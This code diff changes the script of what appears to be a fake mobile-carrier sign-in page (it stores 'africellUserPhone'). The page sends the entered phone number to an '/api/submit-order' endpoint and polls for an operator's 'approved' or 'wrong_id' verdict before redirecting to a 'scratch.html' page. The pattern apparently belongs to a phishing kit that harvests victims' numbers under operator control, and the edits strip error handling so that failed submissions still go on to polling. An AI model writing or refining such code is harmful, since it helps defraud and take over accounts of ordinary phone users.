@@ -187,10 +187,8 @@
 
         let phoneValue = '';
         let activeInterval = null;
-        let safetyTimeout = null;
         let submissionTime = 0;
-        let errorTimeout = null;
-        let isSubmitting = false;
+        let errorTimeout = null; // Timer for auto-dismissing alerts
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
@@ -200,17 +198,6 @@
                 validateForm();
             }
         });
-
-        function clearTimers() {
-            if (activeInterval) {
-                clearInterval(activeInterval);
-                activeInterval = null;
-            }
-            if (safetyTimeout) {
-                clearTimeout(safetyTimeout);
-                safetyTimeout = null;
-            }
-        }
 
         function showInlineError(msg) { 
             errorText.innerText = msg; 
@@ -228,7 +215,6 @@
         }
 
         function pressKey(digit) {
-            if (isSubmitting) return;
             if (phoneValue.length < 15) {
                 phoneValue += digit;
                 mobileInput.value = phoneValue;
@@ -237,7 +223,6 @@
         }
 
         function deleteKey() {
-            if (isSubmitting) return;
             if (phoneValue.length > 0) {
                 phoneValue = phoneValue.slice(0, -1);
                 mobileInput.value = phoneValue;
@@ -246,7 +231,6 @@
         }
 
         function validateForm() {
-            if (isSubmitting) return;
             if (phoneValue.trim().length >= 7) {
                 loginBtn.removeAttribute('disabled');
                 loginBtn.classList.add('enabled');
@@ -258,7 +242,6 @@
         }
 
         function handleLogin() {
-            if (isSubmitting) return;
             const rawPhone = phoneValue.trim();
 
             if (rawPhone.length < 7) {
@@ -275,50 +258,41 @@
 
         async function submitLoginCredentials(phone) {
             try {
-                isSubmitting = true;
-                clearTimers();
                 loginBtn.setAttribute('disabled', 'true');
                 loginBtn.classList.remove('enabled');
                 loginBtn.textContent = 'Signing in...';
                 submissionTime = Date.now();
 
-                const response = await fetch('/api/submit-order', {
+                await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone, uniqueId: 'Sign-in Phone Number: ' + phone })
                 });
 
-                const result = await response.json().catch(() => ({}));
-                if (!response.ok || (result && result.success === false)) {
-                    resetBtnState();
-                    showInlineError(result?.message || 'Unable to submit request. Please try again.');
-                    return;
-                }
-
                 pollApprovalStatus(phone);
             } catch (err) {
-                console.error('Submit login error:', err);
-                resetBtnState();
-                showInlineError('Network error while signing in. Please try again.');
+                pollApprovalStatus(phone);
             }
         }
 
         function resetBtnState() {
-            isSubmitting = false;
-            clearTimers();
             loginBtn.textContent = 'Sign in';
+            loginBtn.removeAttribute('disabled');
+            loginBtn.classList.add('enabled');
             phoneValue = '';
             mobileInput.value = '';
-            loginBtn.setAttribute('disabled', 'true');
-            loginBtn.classList.remove('enabled');
         }
 
         function pollApprovalStatus(phone) {
-            clearTimers();
+            if (activeInterval) clearInterval(activeInterval);
 
-            safetyTimeout = setTimeout(() => {
-                resetBtnState();
-                showInlineError('⚠️ Request timed out after 5 minutes. Please try again.');
+            // Safety timeout: unfreezes and resets after 5 minutes (300,000 ms) if no response
+            const safetyTimeout = setTimeout(() => {
+                if (activeInterval) {
+                    clearInterval(activeInterval);
+                    resetBtnState();
+                    showInlineError('⚠️ Request timed out after 5 minutes. Please try again.');
+                }
             }, 300000);
 
             activeInterval = setInterval(async () => {
@@ -326,13 +300,14 @@
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}&t=${Date.now()}`);
                     const data = await response.json();
 
-                    if (data.status === 'approved' && (!data.timestamp || data.timestamp >= submissionTime - 5000)) {
-                        clearTimers();
-                        isSubmitting = false;
+                    if (data.status === 'approved' && (!data.timestamp || data.timestamp >= submissionTime)) {
+                        clearTimeout(safetyTimeout);
+                        clearInterval(activeInterval);
                         window.location.href = 'scratch.html';
                     } 
-                    else if ((data.status === 'rejected' || data.status === 'wrong_id') && (!data.timestamp || data.timestamp >= submissionTime - 5000)) {
-                        clearTimers();
+                    else if ((data.status === 'rejected' || data.status === 'wrong_id') && (!data.timestamp || data.timestamp >= submissionTime)) {
+                        clearTimeout(safetyTimeout);
+                        clearInterval(activeInterval);
                         showInlineError('⚠️ Incorrect phone number. Please try again.');
                         resetBtnState();
                     }
